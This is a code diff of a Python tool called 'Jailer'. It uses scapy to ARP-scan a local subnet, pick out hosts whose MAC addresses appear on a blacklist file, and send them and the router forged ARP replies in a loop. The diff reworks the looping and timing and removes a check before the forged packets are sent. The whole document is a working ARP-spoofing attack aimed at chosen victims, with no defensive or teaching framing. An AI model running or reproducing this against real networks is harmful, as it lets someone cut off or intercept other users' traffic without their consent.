@@ -17,7 +17,7 @@ class Jailer:
         
     @staticmethod
     def getBlacklist():
-        blacklist = []
+        blacklist = list()
 
         with open("jail.csv",newline="") as f:
             reader = csv.reader(f)
@@ -33,40 +33,28 @@ class Jailer:
     def jail(self):
         router = {"ip":self.routerIP,"mac":self.findMAC(self.routerIP)}
         found, not_found, time_elapsed = self.findIP(self.blacklist)
-        print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")
+        print(f"{self.getTime()} >>> {len(found)}/{len(not_found)} found in {time_elapsed:.2f}s")
 
-        while 1:
-            try:
-                # nothing found
-                if len(found) == 0:
-                    print(f"{self.getTime()} >>> no target, trying again in {self.interval/60:.0f} minutes... ")
-                    time.sleep(self.interval)
-                    found, not_found, time_elapsed = self.findIP(self.blacklist)
-                    print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")
-                # handle not found in interval
-                elif len(not_found) != 0 and int(time.time()) % self.interval == 0:
-                    print(f"{self.getTime()} >>> research targets...")
-                    found_temp, not_found, time_elapsed = self.findIP(not_found)
-                    for _ in found_temp:
-                        found.append(found_temp)
-                    print(f"{self.getTime()} >>> {len(found)} found in {time_elapsed:.2f}s")
-                
-                # found case
-                for _ in found:
-                    if self.isAlive(_):
-                        self.spoof(router, _)
-                    else:
-                        print("{} >>> {} goes offline".format(self.getTime(), _.get("ip")))
-                        found.remove(_)
+        timer = time.time()
+        while time.time() <= timer + self.interval:
+            for _ in found:
+                if self.isAlive(_):
+                    self.spoof(router, _)
                     time.sleep(1)
                     
+    def execute(self):
+        while 1:
+            try:
+                self.jail()
+                print(f"{self.getTime()} >>> try again...")
             except KeyboardInterrupt:
                 print("======= unjailed! ========")
                 sys.exit()
 
+
     def findIP(self, MAC):
         start = time.time()
-        not_found = MAC
+        not_found = list(MAC)
         found = list()
 
         ans, unans = srp(Ether(dst=Jailer.all_computer)/ARP(pdst=self.initIP+"/"+self.cidr),timeout=2, verbose=False)
@@ -115,22 +103,18 @@ class Jailer:
     @staticmethod
     def spoof(router, victim):
         # router = {"ip":"", "mac":""}
-
-        if victim.get("mac"):
-            send(ARP(op =2, pdst = victim.get("ip"), psrc = router.get("ip"), hwdst = victim.get("mac")), verbose=False)
-            # if time.time() % 5 == 0:
-            #     print(victim.get("mac"))
-            send(ARP(op = 2, pdst = router.get("ip"), psrc = victim.get("ip"), hwdst = router.get("mac")), verbose=False)
+        send(ARP(op =2, pdst = victim.get("ip"), psrc = router.get("ip"), hwdst = victim.get("mac")), verbose=False)
+        send(ARP(op = 2, pdst = router.get("ip"), psrc = victim.get("ip"), hwdst = router.get("mac")), verbose=False)
 
 
 if __name__ == "__main__":
     routerIP = "10.2.255.254"
     initIP = "10.2.1.0"
     cidr="24"
-    interval = 60
+    interval = 90
 
     # jail(routerIP, interval)
     j = Jailer(initIP, cidr, routerIP, interval)
-    j.jail()
+    j.execute()
         
 
